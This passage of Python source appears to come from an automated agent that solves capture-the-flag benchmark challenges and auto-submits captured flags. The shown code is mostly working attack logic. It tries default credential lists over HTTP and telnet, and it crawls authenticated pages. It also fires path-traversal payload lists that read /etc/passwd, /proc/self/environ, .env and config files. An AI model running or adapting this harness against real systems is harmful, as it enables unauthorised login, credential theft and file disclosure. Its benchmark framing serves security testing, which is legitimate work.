        The deterministic URL loop is intentionally stateless. Several easy
        tasks expose demo credentials first and only reveal the useful attack
        surface after login, so this helper keeps a cookie jar for a tight,
        bounded follow-up pass.
        """
        lowered = probe.lower()
        profile = self._benchmark_matching_webapp_flow_profile(lowered)
        if not profile:
            return ""
        credentials = self._benchmark_extract_demo_credentials(probe)
        if not credentials:
            credentials = list(profile.get("credentials") or [])
        tun_interface = self._benchmark_tun_interface()
        cookie_file = tempfile.NamedTemporaryFile(prefix="cyber-agent-bench-", suffix=".cookies", delete=False)
        cookie_path = cookie_file.name
        cookie_file.close()
        outputs: list[str] = [f"## stateful-webapp-flow {base}"]
        try:
            for username, password in credentials[:4]:
                remaining = self._benchmark_deadline_remaining(deadline)
                if remaining <= 3.0:
                    outputs.append(f"## webapp budget exhausted {base}")
                    break
                login_url = self._benchmark_login_url_from_probe(base, probe)
                result = self._benchmark_curl_local(
                    login_url,
                    tun_interface=tun_interface,
                    cookie_path=cookie_path,
                    method="POST",
                    data={"username": username, "password": password},
                    timeout=max(3, min(8, int(remaining))),
                )
                outputs.append(
                    f"## login {username}:{password} {login_url}\n"
                    f"{(result.stdout or '')[:1600]}\n{(result.stderr or '')[:300]}"
                )
                if "location: /login.php" in (result.stdout or "").lower() and "dashboard" not in (result.stdout or "").lower():
                    continue
                auth_output = self._benchmark_probe_authenticated_webapp(
                    code,
                    base,
                    tun_interface,
                    cookie_path,
                    probe,
                    profile,
                    deadline=deadline,
                )
                if auth_output:
                    outputs.append(auth_output)
                with self._benchmark_state_lock:
                    completed = set(self._benchmark_state.get("completed_challenges", set()))
                if code in completed:
                    break
        finally:
            try:
                Path(cookie_path).unlink(missing_ok=True)
            except OSError:
                pass
        return "\n".join(outputs)

    def _benchmark_matching_webapp_flow_profile(
        self,
        lowered_probe: str,
    ) -> dict[str, Any] | None:
        best_profile: dict[str, Any] | None = None
        best_score = -1
        for profile in self._benchmark_webapp_flow_profiles():
            indicators = profile.get("indicators") or ()
            matched_lengths = [
                len(marker)
                for marker in (str(marker).lower() for marker in indicators)
                if marker and marker in lowered_probe
            ]
            if not matched_lengths:
                continue
            score = max(matched_lengths)
            if score > best_score:
                best_score = score
                best_profile = profile
        return best_profile

    @staticmethod
    def _benchmark_builtin_webapp_flow_profiles() -> list[dict[str, Any]]:
        return [
            {
                "name": "form-login-and-file-download",
                "indicators": (
                    "login",
                    "登录",
                    "测试账号",
                    "test account",
                    "<form",
                    "name=\"password\"",
                    "name='password'",
                ),
                "credentials": (
                    ("admin", "admin123"),
                    ("employee", "employee123"),
                    ("admin", "admin"),
                    ("admin", "password"),
                    ("test", "test"),
                    ("user", "password"),
                ),
                "authenticated_paths": (
                    "",
                    "dashboard.php",
                    "admin",
                    "download.php",
                    "upload.php",
                ),
                "handoff_paths": (
                    "api/approve.php",
                    "api/approval.php",
                    "api/review.php",
                    "approve.php",
                    "approval.php",
                    "review.php",
                    "contract_approval.php",
                    "admin_approve.php",
                    "download.php?id=init_config.txt",
                    "download.php?id=system-init-config",
                    "download.php?id=../../../../challenge/flag.txt",
                    "download.php?id=../../../../var/www/html/contracts/flag.txt",
                    "download.php?id=../../../../var/www/html/contracts/init_config.txt",
                    "download.php?id=../../../../var/www/html/logs/app.log",
                ),
            }
        ]

    def _benchmark_normalize_webapp_flow_profile(
        self,
        raw: Any,
    ) -> dict[str, Any] | None:
        if not isinstance(raw, dict):
            return None
        name = str(raw.get("name") or "").strip().lower()
        if not _re_mod.fullmatch(r"[a-z0-9_.-]{1,80}", name):
            return None
        profile: dict[str, Any] = {"name": name}
        indicators = self._benchmark_string_tuple(raw.get("indicators"))
        if indicators:
            profile["indicators"] = indicators
        credentials = self._benchmark_string_pair_tuple(raw.get("credentials"))
        if credentials:
            profile["credentials"] = credentials
        for key in ("authenticated_paths", "handoff_paths"):
            values = self._benchmark_string_tuple(raw.get(key), limit=120)
            if values:
                profile[key] = values
        if not any(
            key in profile
            for key in ("indicators", "credentials", "authenticated_paths", "handoff_paths")
        ):
            return None
        return profile

    def _benchmark_external_webapp_flow_profiles(self) -> list[dict[str, Any]]:
        data = self._benchmark_external_profiles()
        raw_profiles = data.get("webapp_flow_profiles", data.get("webapp_profiles", []))
        if not isinstance(raw_profiles, list):
            return []
        profiles: list[dict[str, Any]] = []
        for raw in raw_profiles[:40]:
            profile = self._benchmark_normalize_webapp_flow_profile(raw)
            if profile is not None:
                profiles.append(profile)
        return profiles

    def _benchmark_webapp_flow_profiles(self) -> list[dict[str, Any]]:
        builtin = (
            self._benchmark_builtin_webapp_flow_profiles()
            if self._benchmark_builtin_section_enabled("webapp_flow_profiles")
            else []
        )
        return self._benchmark_merge_profiles_by_key(
            builtin,
            self._benchmark_external_webapp_flow_profiles(),
            "name",
        )

    @staticmethod
    def _benchmark_extract_demo_credentials(text: str) -> list[tuple[str, str]]:
        credentials: list[tuple[str, str]] = []
        patterns = [
            r"(?:测试账号|test account|demo account)[^A-Za-z0-9]{0,20}([A-Za-z0-9_.@-]{2,40})\s*/\s*([A-Za-z0-9_.@#$%^&*()-]{2,60})",
            r"(?:username|user|账号|用户)[^A-Za-z0-9]{0,20}([A-Za-z0-9_.@-]{2,40}).{0,40}(?:password|pass|密码)[^A-Za-z0-9]{0,20}([A-Za-z0-9_.@#$%^&*()-]{2,60})",
            r"'([A-Za-z0-9_.@-]{2,40})'\s*=>\s*\[[^\]]{0,400}?'password'\s*=>\s*'([^']{2,80})'",
        ]
        for pattern in patterns:
            for username, password in _re_mod.findall(pattern, text, flags=_re_mod.IGNORECASE | _re_mod.DOTALL):
                username = username.strip()
                password = password.strip()
                if BenchmarkProbeMixin._benchmark_looks_like_html_field_name(username):
                    continue
                if BenchmarkProbeMixin._benchmark_looks_like_html_field_name(password):
                    continue
                credentials.append((username, password))
        return list(dict.fromkeys(credentials))

    @staticmethod
    def _benchmark_looks_like_html_field_name(value: str) -> bool:
        lowered = value.strip().lower()
        return lowered in {
            "input",
            "form",
            "label",
            "button",
            "submit",
            "username",
            "user",
            "password",
            "pass",
            "text",
            "hidden",
        }

    def _benchmark_default_web_credentials(self) -> list[tuple[str, str]]:
        profile = self._benchmark_webapp_flow_profiles()[0]
        return list(profile["credentials"])

    def _benchmark_login_url_from_probe(self, base: str, probe: str) -> str:
        for action in _re_mod.findall(
            r"""<form[^>]{0,400}action\s*=\s*["']([^"']*)["']""",
            probe,
            flags=_re_mod.IGNORECASE,
        ):
            if action.strip():
                return _urljoin(base, action.strip())
        if "login.php" in probe.lower():
            return _urljoin(base, "login.php")
        return base

    def _benchmark_probe_authenticated_webapp(
        self,
        code: str,
        base: str,
        tun_interface: str,
        cookie_path: str,
        seed_probe: str,
        profile: dict[str, Any] | None = None,
        deadline: float | None = None,
    ) -> str:
        outputs: list[str] = []
        active_profile = profile or self._benchmark_webapp_flow_profiles()[0]
        queue: list[str] = [
            _urljoin(base, str(path))
            for path in active_profile.get("authenticated_paths", ())
        ]
        for derived in self._benchmark_derive_probe_urls(base, seed_probe):
            queue.append(derived)
        seen: set[str] = set()
        captured_text = seed_probe
        index = 0
        max_authenticated_urls = self._benchmark_control_int("max_authenticated_urls")
        while index < len(queue) and index < max_authenticated_urls:
            remaining = self._benchmark_deadline_remaining(deadline)
            if remaining <= 3.0:
                outputs.append(f"## authenticated budget exhausted {base}")
                break
            url = queue[index]
            index += 1
            if url in seen or not self._benchmark_url_is_same_container(base, url):
                continue
            if "logout" in _urlparse(url).path.lower():
                continue
            seen.add(url)
            result = self._benchmark_curl_local(
                url,
                tun_interface=tun_interface,
                cookie_path=cookie_path,
                timeout=max(3, min(7, int(remaining))),
            )
            body = (result.stdout or "")[:5000]
            outputs.append(f"## auth {url}\n{body}\n{(result.stderr or '')[:300]}")
            captured_text += "\n" + body
            self._benchmark_auto_submit_flags_from_tool_result(
                f"命令: authenticated_probe {url}\n工作目录: /home/my/cyber/benchmark_test\n"
                f"退出码: {result.returncode}\n输出:\n{body}"
            )
            with self._benchmark_state_lock:
                completed = set(self._benchmark_state.get("completed_challenges", set()))
            if code in completed:
                break
            priority_urls = [
                derived for derived in self._benchmark_lfi_probe_urls_from_response(base, url, body, captured_text)
                if derived not in seen and derived not in queue
            ]
            if priority_urls:
                queue[index:index] = priority_urls
            for derived in self._benchmark_derive_probe_urls(base, body):
                if derived not in seen and derived not in queue:
                    queue.append(derived)
        if outputs:
            return "## authenticated-webapp-probe\n" + "\n".join(outputs)
        return ""

    def _benchmark_curl_local(
        self,
        url: str,
        *,
        tun_interface: str,
        cookie_path: str | None = None,
        method: str = "GET",
        data: dict[str, str] | None = None,
        timeout: int = 6,
    ) -> subprocess.CompletedProcess[str]:
        cmd = [
            "curl",
            "-sS",
            "-k",
            "--interface",
            tun_interface,
            "--connect-timeout",
            "2",
            "--max-time",
            str(max(3, timeout - 2)),
            "--globoff",
            "-i",
        ]
        if cookie_path:
            cmd.extend(["-c", cookie_path, "-b", cookie_path])
        if method.upper() == "POST":
            cmd.extend(["-X", "POST"])
        if data:
            for key, value in data.items():
                cmd.extend(["--data-urlencode", f"{key}={value}"])
        cmd.append(url)
        try:
            return subprocess.run(
                cmd,
                check=False,
                text=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=timeout,
            )
        except Exception as exc:
            return subprocess.CompletedProcess(cmd, 1, stdout="", stderr=str(exc))

    def _benchmark_lfi_probe_urls_from_response(
        self,
        base: str,
        current_url: str,
        body: str,
        accumulated_text: str,
    ) -> list[str]:
        urls: list[str] = []
        parsed_current = _urlparse(current_url)
        pairs = _parse_qsl(parsed_current.query, keep_blank_values=True)
        lfi_param_keys = self._benchmark_lfi_param_keys()
        lfi_keys = [
            key for key, _ in pairs
            if any(part in key.lower() for part in lfi_param_keys)
        ]
        default_endpoint = self._benchmark_lfi_default_endpoint()
        if default_endpoint and default_endpoint in parsed_current.path.lower() and not lfi_keys:
            lfi_keys.append("id")
        trigger_markers = self._benchmark_lfi_trigger_markers()
        if not lfi_keys and not any(marker in body.lower() for marker in trigger_markers):
            return []
        candidates = self._benchmark_lfi_candidate_paths(accumulated_text)
        base_without_query = _urlunparse(parsed_current._replace(query=""))
        if (
            not lfi_keys
            and default_endpoint
            and any(marker in body.lower() for marker in trigger_markers)
        ):
            base_without_query = _urljoin(base, default_endpoint)
            lfi_keys = ["id"]
        for key in dict.fromkeys(lfi_keys):
            for candidate in candidates:
                urls.append(f"{base_without_query}?{_urlencode({key: candidate})}")
        return urls[:80]

    def _benchmark_lfi_param_keys(self) -> tuple[str, ...]:
        data = self._benchmark_external_profiles()
        external = self._benchmark_string_tuple(
            data.get("lfi_param_keys", data.get("lfi_keys", ())),
            limit=80,
        )
        builtin = (
            ("id", "file", "path", "name", "download")
            if self._benchmark_builtin_section_enabled("lfi_detection")
            else ()
        )
        return tuple(
            dict.fromkeys(
                key.lower()
                for key in builtin + external
                if _re_mod.fullmatch(r"[a-z0-9_.-]{1,80}", key.lower())
            )
        )

    def _benchmark_lfi_trigger_markers(self) -> tuple[str, ...]:
        data = self._benchmark_external_profiles()
        external = self._benchmark_string_tuple(data.get("lfi_trigger_markers"), limit=80)
        builtin = (
            ("缺少文件", "file id", "download")
            if self._benchmark_builtin_section_enabled("lfi_detection")
            else ()
        )
        return tuple(dict.fromkeys(marker.lower() for marker in builtin + external if marker))

    def _benchmark_lfi_default_endpoint(self) -> str:
        data = self._benchmark_external_profiles()
        raw = str(data.get("lfi_default_endpoint") or "").strip().lstrip("/")
        if raw and _re_mod.fullmatch(r"[A-Za-z0-9_./-]{1,120}", raw):
            return raw.lower()
        return "download.php" if self._benchmark_builtin_section_enabled("lfi_detection") else ""

    @staticmethod
    def _benchmark_builtin_lfi_base_paths() -> list[str]:
        return [
            "../../../../etc/passwd",
            "../../../../challenge/flag.txt",
            "../../../../challenge/flag",
            "../../../../flag",
            "../../../../flag.txt",
            "../../../../root/flag",
            "../../../../root/flag.txt",
            "../../../../tmp/flag",
            "../../../../tmp/flag.txt",
            "../../../../var/www/html/.env",
            "../../../../var/www/html/.htaccess",
            "../../../../var/www/html/index.php",
            "../../../../var/www/html/login.php",
            "../../../../var/www/html/dashboard.php",
            "../../../../var/www/html/download.php",
            "../../../../var/www/html/upload.php",
            "../../../../var/www/html/includes/config.php",
            "../../../../var/www/html/includes/auth.php",
            "../../../../var/www/html/config.php",
            "../../../../var/www/html/contracts/.htaccess",
            "../../../../var/www/html/logs/app.log",
            "../../../../proc/self/environ",
        ]

    def _benchmark_lfi_base_paths(self) -> list[str]:
        data = self._benchmark_external_profiles()
        external_paths = self._benchmark_string_tuple(
            data.get("lfi_base_paths", data.get("lfi_paths", ())),
            limit=120,
        )
        builtin = (
            self._benchmark_builtin_lfi_base_paths()
            if self._benchmark_builtin_section_enabled("lfi_base_paths")
            else []
        )
        return list(
            dict.fromkeys(
                builtin + list(external_paths)
            )
        )

    @staticmethod
    def _benchmark_lfi_discovered_paths(text: str) -> list[str]:
        discovered: list[str] = []
        for raw in _re_mod.findall(r"""['"]([A-Za-z0-9_.-]+\.(?:txt|pdf|docx?|xlsx?|log|conf|php|json|ya?ml))['"]""", text):
            discovered.extend([raw, f"../../../../var/www/html/contracts/{raw}", f"../../../../var/www/html/uploads/{raw}"])
        for raw in _re_mod.findall(r"(?:CONTRACT|contract)[-_][A-Za-z0-9_.-]{1,80}", text):
            for suffix in ("", ".pdf", ".txt"):
                discovered.append(f"{raw}{suffix}")
                discovered.append(f"../../../../var/www/html/contracts/{raw}{suffix}")
        return discovered

    def _benchmark_lfi_candidate_paths(self, text: str) -> list[str]:
        return list(
            dict.fromkeys(
                self._benchmark_lfi_base_paths()
                + self._benchmark_lfi_discovered_paths(text)
            )
        )[:80]

    @staticmethod
    def _benchmark_probe_suggests_raw_text_protocol(probe: str) -> bool:
        lowered = probe.lower()
        return any(
            marker in lowered
            for marker in (
                "received http/0.9",
                "responsd ready",
                "unknown command",
            )
        )

    def _benchmark_probe_raw_text_protocol(self, code: str, addr: str) -> str:
        host, port_text = addr.rsplit(":", 1)
        try:
            port = int(port_text)
        except ValueError:
            return ""
        outputs: list[str] = [f"## raw-text-protocol {addr}"]
        try:
            with socket_mod.create_connection((host, port), timeout=3) as sock:
                sock.settimeout(1.5)

                def recv_some() -> str:
                    try:
                        return sock.recv(4096).decode("utf-8", errors="replace")
                    except TimeoutError:
                        return ""
                    except OSError as exc:
                        return f"ERROR: {exc}\n"

                banner = recv_some()
                if banner:
                    outputs.append(banner)
                for command in self._benchmark_raw_protocol_commands():
                    try:
                        sock.sendall(f"{command}\n".encode("utf-8"))
                    except OSError as exc:
                        outputs.append(f"> {command}\nERROR: {exc}")
                        break
                    time_mod.sleep(0.1)
                    outputs.append(f"> {command}\n{recv_some()}")
        except OSError as exc:
            outputs.append(f"ERROR: {exc}")
        output = "\n".join(outputs)
        synthetic_content = (
            "命令: raw_text_protocol_probe "
            f"{addr} {' '.join(self._benchmark_raw_protocol_commands())}\n"
            "工作目录: /home/my/cyber/benchmark_test\n"
            "退出码: 0\n"
            "输出:\n"
            f"{output}"
        )
        self._benchmark_auto_submit_flags_from_tool_result(synthetic_content)
        with self._benchmark_state_lock:
            completed = set(self._benchmark_state.get("completed_challenges", set()))
        if code in completed:
            self._record_trace(
                "benchmark_raw_protocol_flag",
                detail=f"{code} raw text protocol probe submitted a flag.",
                metadata={"challenge": code},
            )
        return output

    def _benchmark_raw_protocol_commands(self) -> tuple[str, ...]:
        data = self._benchmark_external_profiles()
        external = self._benchmark_string_tuple(data.get("raw_protocol_commands"), limit=30)
        builtin = (
            ("HELP", "SETBODY hello", "BUILD", "QUIT")
            if self._benchmark_builtin_section_enabled("raw_protocol_commands")
            else ()
        )
        return tuple(dict.fromkeys(builtin + external))

    @staticmethod
    def _benchmark_telnet_plain_and_reply(data: bytes) -> tuple[str, bytes]:
        iac = 255
        dont = 254
        do = 253
        wont = 252
        will = 251
        output = bytearray()
        reply = bytearray()
        index = 0
        while index < len(data):
            byte = data[index]
            if byte == iac and index + 2 < len(data):
                command = data[index + 1]
                option = data[index + 2]
                if command == do:
                    reply.extend((iac, wont, option))
                elif command == will:
                    reply.extend((iac, dont, option))
                index += 3
                continue
            output.append(byte)
            index += 1
        return output.decode("utf-8", errors="replace"), bytes(reply)

    def _benchmark_telnet_recv(self, sock: socket_mod.socket, seconds: float) -> str:
        deadline = time_mod.monotonic() + seconds
        text = ""
        while time_mod.monotonic() < deadline:
            try:
                data = sock.recv(4096)
            except TimeoutError:
                continue
            except OSError:
                break
            if not data:
                break
            plain, reply = self._benchmark_telnet_plain_and_reply(data)
            if reply:
                try:
                    sock.sendall(reply)
                except OSError:
                    break
            text += plain
            if _re_mod.search(
                r"(login:|password:|[$#>]\s*$|flag\{)",
                text,
                _re_mod.IGNORECASE,
            ):
                break
        return text

    def _benchmark_probe_telnet_login_local(self, code: str, addr: str) -> str:
        host, port_text = addr.rsplit(":", 1)
        try:
            port = int(port_text)
        except ValueError:
            return f"## telnet-login {addr}\nERROR: invalid port"

        detected = self._benchmark_detect_tun_local()
        source_ip = detected[1] if detected else ""
        credentials = self._benchmark_telnet_credentials()
        flag_command = self._benchmark_telnet_flag_command()
        outputs: list[str] = [f"## telnet-login {addr}"]
        for username, password in credentials:
            session_text = ""
            try:
                with socket_mod.socket(socket_mod.AF_INET, socket_mod.SOCK_STREAM) as sock:
                    if source_ip:
                        try:
                            sock.bind((source_ip, 0))
                        except OSError:
                            pass
                    sock.settimeout(3)
                    sock.connect((host, port))
                    sock.settimeout(0.4)
                    session_text += self._benchmark_telnet_recv(sock, 1.5)
                    if "login:" not in session_text.lower():
                        sock.sendall(b"\r\n")
                        session_text += self._benchmark_telnet_recv(sock, 1.0)
                    sock.sendall(f"{username}\r\n".encode("utf-8"))
                    session_text += self._benchmark_telnet_recv(sock, 1.0)
                    sock.sendall(f"{password}\r\n".encode("utf-8"))
                    session_text += self._benchmark_telnet_recv(sock, 2.0)
                    logged_in = (
                        "login incorrect" not in session_text.lower()
                        and (
                            bool(_re_mod.search(r"[$#>]\s*$", session_text))
                            or "last login:" in session_text.lower()
                            or f"{username}@" in session_text.lower()
                        )
                    )
                    if logged_in:
                        sock.sendall(flag_command.encode("utf-8"))
                        session_text += self._benchmark_telnet_recv(sock, 3.0)
            except OSError as exc:
                session_text += f"\nERROR: {exc}"
            outputs.append(
                f"## credential {username}/{password}\n{session_text[-2500:]}"
            )
            self._benchmark_auto_submit_flags_from_tool_result(
                f"命令: telnet_login_probe {addr} {username}/{password}\n"
                "工作目录: /home/my/cyber/benchmark_test\n"
                "退出码: 0\n"
                "输出:\n"
                f"{session_text}"
            )
            with self._benchmark_state_lock:
                completed = set(self._benchmark_state.get("completed_challenges", set()))
            if code in completed or "flag{" in session_text.lower():
                break
        return "\n".join(outputs)

    def _benchmark_telnet_credentials(self) -> tuple[tuple[str, str], ...]:
        data = self._benchmark_external_profiles()
        external = self._benchmark_string_pair_tuple(data.get("telnet_credentials"), limit=30)
        builtin = (
            ("root", "root"),
            ("root", "password"),
            ("root", "toor"),
            ("admin", "admin"),
            ("admin", "password"),
            ("user", "user"),
            ("guest", "guest"),
            ("ctf", "ctf"),
            ("test", "test"),
        ) if self._benchmark_builtin_section_enabled("telnet_credentials") else ()
        return tuple(dict.fromkeys(builtin + external))

    def _benchmark_telnet_flag_command(self) -> str:
        data = self._benchmark_external_profiles()
        raw = str(data.get("telnet_flag_command") or "").strip()
        if raw:
            return raw[:400] + ("\n" if not raw.endswith("\n") else "")
        return self._benchmark_flag_cat_command(limit=20)

    def _benchmark_probe_handoff_followup_local(self, code: str, addrs: list[str]) -> str:
        if not addrs:
            return "无容器地址，无法 handoff follow-up。"
        deadline = time_mod.monotonic() + self._benchmark_control_int("fast_probe_seconds")
        addr = addrs[0]
        if not _re_mod.fullmatch(r"10\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}", addr):
            return f"容器地址格式异常: {addr}"
        base = f"http://{addr}/"
        tun_interface = self._benchmark_tun_interface()
        outputs: list[str] = [f"## handoff-followup {base}"]
        root = self._benchmark_curl_local(
            base,
            tun_interface=tun_interface,
            timeout=max(3, min(7, int(self._benchmark_deadline_remaining(deadline)))),
        )
        root_text = root.stdout or ""
        service_profile = self._benchmark_matching_service_probe_profile(root_text)
        if service_profile is not None:
            if self._benchmark_deadline_remaining(deadline) <= 3.0:
                outputs.append(f"## handoff budget exhausted {base}")
                return "\n".join(outputs)
            outputs.extend(
                self._benchmark_run_service_probe_profile(
                    code,
                    base,
                    root_text,
                    service_profile,
                )
            )
            return "\n".join(outputs)
        cookie_file = tempfile.NamedTemporaryFile(prefix="cyber-agent-bench-follow-", suffix=".cookies", delete=False)
        cookie_path = cookie_file.name
        cookie_file.close()
        try:
            # 这类 benchmark Web 应用常使用已知的 demo/admin 凭据。
            web_profile = self._benchmark_webapp_flow_profiles()[0]
            for username, password in list(web_profile.get("credentials") or [])[:4]:
                remaining = self._benchmark_deadline_remaining(deadline)
                if remaining <= 3.0:
                    outputs.append(f"## handoff budget exhausted {base}")
                    break
                self._benchmark_curl_local(
                    _urljoin(base, "login.php"),
                    tun_interface=tun_interface,
                    cookie_path=cookie_path,
                    method="POST",
                    data={"username": username, "password": password},
                    timeout=max(3, min(6, int(remaining))),
                )
                for path in web_profile.get("handoff_paths", ()):
                    remaining = self._benchmark_deadline_remaining(deadline)
                    if remaining <= 3.0:
                        outputs.append(f"## handoff budget exhausted {base}")
                        return "\n".join(outputs)
                    url = _urljoin(base, path)
                    result = self._benchmark_curl_local(
                        url,
                        tun_interface=tun_interface,
                        cookie_path=cookie_path,
                        timeout=max(3, min(6, int(remaining))),
                    )
                    body = (result.stdout or "")[:2500]
                    outputs.append(f"## {username} {url}\n{body}\n{(result.stderr or '')[:200]}")
                    self._benchmark_auto_submit_flags_from_tool_result(
                        f"命令: handoff_followup {url}\n工作目录: /home/my/cyber/benchmark_test\n"
                        f"退出码: {result.returncode}\n输出:\n{body}"
                    )
                    with self._benchmark_state_lock:
                        completed = set(self._benchmark_state.get("completed_challenges", set()))
                    if code in completed:
                        return "\n".join(outputs)
        finally:
            try:
                Path(cookie_path).unlink(missing_ok=True)
            except OSError:
                pass
        return "\n".join(outputs)

    def _benchmark_wait_for_container_ready(
        self,
        url: str,
        outputs: list[str],
        *,
        deadline: float | None = None,
    ) -> str:
        root_body = ""
        tun_interface = self._benchmark_tun_interface()
        for index, delay in enumerate((0.0, 1.0, 2.0, 3.0, 5.0, 8.0)):
            remaining = self._benchmark_deadline_remaining(deadline)
            if remaining <= 1.0:
                outputs.append(f"## readiness budget exhausted {url}")
                break
            if delay:
                time_mod.sleep(min(delay, max(0.0, remaining - 1.0)))
            remaining = self._benchmark_deadline_remaining(deadline)
            if remaining <= 1.0:
                outputs.append(f"## readiness budget exhausted {url}")
                break
            curl_max_time = max(1, min(5, int(remaining)))
            run_timeout = max(2, min(5, int(remaining) + 1))
            cmd = [
                "curl",
                "-sS",
                "-k",
                "--interface",
                tun_interface,
                "--connect-timeout",
                "2",
                "--max-time",
                str(curl_max_time),
                "-i",
                url,
            ]
            try:
                result = subprocess.run(
                    cmd,
                    check=False,
                    text=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    timeout=run_timeout,
                )
            except Exception as exc:
                outputs.append(f"## readiness {index + 1} {url}\nERROR: {exc}")
                continue
            root_body = result.stdout or ""
            err = result.stderr or ""
            if result.returncode == 0 and root_body:
                outputs.append(f"## readiness {index + 1} {url}\n{root_body[:2500]}\n{err[:500]}")
                return root_body
            outputs.append(f"## readiness {index + 1} {url}\n{root_body[:1000]}\n{err[:500]}")
        outputs.append(
            f"## readiness exhausted {url}\n"
            "容器在短重试窗口内未稳定返回；后续探测仍会尝试有限路径，"
            "只有所有探测均无 HTTP/协议信号时才按不可达计数。"
        )
        return root_body

    def _benchmark_derive_probe_urls(self, base: str, html: str) -> list[str]:
        if not html:
            return []
        urls: list[str] = []
        attr_values = _re_mod.findall(
            r"""(?:href|src|action)\s*=\s*["']([^"']{1,240})["']""",
            html,
            flags=_re_mod.IGNORECASE,
        )
        for value in attr_values:
            if value.startswith(("mailto:", "javascript:", "#")):
                continue
            url = _urljoin(base, value)
            if self._benchmark_url_is_same_container(base, url):
                urls.append(url)
        urls.extend(self._benchmark_text_path_probe_urls(base, html))
        urls.extend(self._benchmark_object_storage_probe_urls(base, html, attr_values))

        discovered_names = {
            name for name in _re_mod.findall(
                r"""(?:name|id)\s*=\s*["']([A-Za-z0-9_-]{1,40})["']""",
                html,
                flags=_re_mod.IGNORECASE,
            )
        }
        discovered_names.update(self._benchmark_schema_parameter_names(html))
        for url in list(urls):
            parsed = _urlparse(url)
            for key, _ in _parse_qsl(parsed.query, keep_blank_values=True):
                if key:
                    discovered_names.add(key)
            if parsed.query:
                urls.extend(self._benchmark_payload_urls_for_query_url(url))

        self._benchmark_note_observed_candidates(
            base=base,
            urls=urls,
            param_names=discovered_names,
        )
        discovered_names.update(self._benchmark_observed_param_names())
        for name, values in self._benchmark_schema_parameter_values(html).items():
            for value in values:
                urls.append(f"{base}?{_urlencode({name: value})}")
        for name in sorted(discovered_names):
            urls.extend(self._benchmark_payload_urls_for_param(base, name))
        return urls

    @staticmethod
    def _benchmark_schema_parameter_names(text: str) -> set[str]:
        names: set[str] = set()
        if not text:
            return names
        sample = text[:40000]
        try:
            parsed = json.loads(sample)
        except Exception:
            parsed = None
            for raw_name in _re_mod.findall(
                r'''"([A-Za-z0-9_-]{1,40})"\s*:\s*\{[^{}]{0,400}'''
                r'''(?:"example"|"default"|"const"|"enum"|"type")''',
                sample,
            ):
                names.add(raw_name)
            for raw_name in _re_mod.findall(
                r'''"name"\s*:\s*"([A-Za-z0-9_-]{1,40})"''',
                sample,
            ):
                names.add(raw_name)
        if isinstance(parsed, (dict, list)):
            def visit(value: Any) -> None:
                if isinstance(value, dict):
                    raw_name = value.get("name")
                    if isinstance(raw_name, str):
                        names.add(raw_name)
                    properties = value.get("properties")
                    if isinstance(properties, dict):
                        for property_name in properties:
                            if isinstance(property_name, str):
                                names.add(property_name)
                    for child in value.values():
                        visit(child)
                elif isinstance(value, list):
                    for child in value[:200]:
                        visit(child)

            visit(parsed)
        patterns = (
            r'"name"\s*:\s*"([A-Za-z_][A-Za-z0-9_-]{0,39})"',
            r"'name'\s*:\s*'([A-Za-z_][A-Za-z0-9_-]{0,39})'",
            r'"properties"\s*:\s*\{([^{}]{1,3000})\}',
            r"'properties'\s*:\s*\{([^{}]{1,3000})\}",
        )
        for pattern in patterns[:2]:
            for raw_name in _re_mod.findall(pattern, sample):
                names.add(raw_name)
        for pattern in patterns[2:]:
            for block in _re_mod.findall(pattern, sample):
                for raw_name in _re_mod.findall(
                    r"""["']([A-Za-z_][A-Za-z0-9_-]{0,39})["']\s*:""",
                    block,
                ):
                    names.add(raw_name)
        ignored = {
            "type",
            "title",
            "description",
            "required",
            "schema",
            "items",
            "properties",
        }
        return {
            name for name in names
            if name.lower() not in ignored and len(name) <= 40
        }

    @staticmethod
    def _benchmark_safe_schema_value(value: Any) -> str | None:
        if isinstance(value, bool):
            return "true" if value else "false"
        if isinstance(value, (int, float)):
            return str(value)
        if not isinstance(value, str):
            return None
        cleaned = value.strip()
        if not cleaned or len(cleaned) > 180:
            return None
        if _re_mod.search(r"[\x00-\x08\x0b\x0c\x0e-\x1f<>`{}|]", cleaned):
            return None
        return cleaned

    def _benchmark_schema_parameter_values(self, text: str) -> dict[str, tuple[str, ...]]:
        if not text:
            return {}
        sample = text[:40000]
        try:
            parsed = json.loads(sample)
        except Exception:
            return {}
        values: dict[str, list[str]] = {}

        def add_value(name: Any, value: Any) -> None:
            if not isinstance(name, str) or not _re_mod.fullmatch(r"[A-Za-z_][A-Za-z0-9_-]{0,39}", name):
                return
            safe = self._benchmark_safe_schema_value(value)
            if safe is None:
                return
            bucket = values.setdefault(name, [])
            if safe not in bucket:
                bucket.append(safe)

        def visit(value: Any, current_name: str | None = None) -> None:
            if isinstance(value, dict):
                raw_name = value.get("name")
                local_name = raw_name if isinstance(raw_name, str) else current_name
                for key in ("example", "default", "const"):
                    if key in value:
                        add_value(local_name, value.get(key))
                enum_values = value.get("enum")
                if isinstance(enum_values, list):
                    for enum_value in enum_values[:8]:
                        add_value(local_name, enum_value)
                properties = value.get("properties")
                if isinstance(properties, dict):
                    for property_name, property_schema in list(properties.items())[:80]:
                        visit(property_schema, str(property_name))
                for child_key, child in value.items():
                    if child_key == "properties":
                        continue
                    visit(child, local_name)
            elif isinstance(value, list):
                for child in value[:200]:
                    visit(child, current_name)

        if isinstance(parsed, (dict, list)):
            visit(parsed)
        return {
            name: tuple(items[:8])
            for name, items in values.items()
            if items
        }

    def _benchmark_text_path_probe_urls(self, base: str, text: str) -> list[str]:
        urls: list[str] = []
        prefixes = self._benchmark_text_path_prefixes()
        if prefixes:
            prefix_pattern = "|".join(_re_mod.escape(prefix.strip("/")) for prefix in prefixes)
            for raw in _re_mod.findall(rf"/(?:{prefix_pattern})[A-Za-z0-9_./-]{{0,160}}", text):
                url = _urljoin(base, raw)
                if self._benchmark_url_is_same_container(base, url):
                    urls.append(url)
        urls.extend(self._benchmark_response_key_path_urls(base, text))
        lowered = text.lower()
        if "/api/functions" in lowered:
            urls.append(_urljoin(base, "api/functions"))
        if '"functions"' in text or "/api/functions" in lowered:
            for name in _re_mod.findall(r'"name"\s*:\s*"([A-Za-z0-9_.-]{1,80})"', text):
                urls.append(_urljoin(base, f"api/functions/{name}/config"))
        return list(dict.fromkeys(urls))[:40]

    def _benchmark_text_path_prefixes(self) -> tuple[str, ...]:
        data = self._benchmark_external_profiles()
        external = self._benchmark_string_tuple(data.get("text_path_prefixes"), limit=80)
        return tuple(
